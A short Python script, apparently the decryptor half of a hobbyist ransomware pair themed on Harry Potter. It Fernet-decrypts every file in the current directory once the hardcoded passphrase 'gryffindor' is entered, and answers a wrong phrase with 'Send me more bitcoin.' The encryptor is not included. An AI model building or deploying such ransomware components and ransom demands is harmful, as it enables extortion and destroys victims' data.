#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet
import sys

# lets find some files

def ransomware_decrypt():

    answer1 = input("Is your encrypt file named 'voldemort.py'? (y/n)")

    if answer1 == "n" or answer1 == "N":
        print("Sorry, your encrypt file must be named 'voldemort.py'.")
        sys.exit()

    elif answer1 == "y" or answer1 == "Y":
        pass

    else:
        print("Invalid Input")
        sys.exit()

    answer2 = input("Is your decrypt file named 'harry.py'? (y/n)")

    if answer2 == "n" or answer2 == "N":
        print("Sorry, you must change the name of your decrypt file to 'harry.py'.")
        sys.exit()

    elif answer2 == "y" or answer2 == "Y":
        pass

    else:
        print("Invalid Input")
        sys.exit()

    files = []

    for file in os.listdir():
            if file == "voldemort.py" or file == "thekey.key" or file == "harry.py":
                    continue
            if os.path.isfile(file):
                    files.append(file)

    print(files)

    with open("thekey.key", "rb") as key:
            secretkey = key.read()

    secretphrase = "gryffindor"

    user_phrase = input("Enter the secret phrase to decrypt your files\n")

    if user_phrase == secretphrase:
            for file in files:
                    with open(file, "rb") as thefile:
                            contents = thefile.read()
                    contents_decrypted = Fernet(secretkey).decrypt(contents)
                    with open(file, "wb") as thefile:
                            thefile.write(contents_decrypted)
                    print("congrats, your files are decrypted. Have fun!")
    else:
            print("Sorry, wrong secret phrase. Send me more bitcoin.")
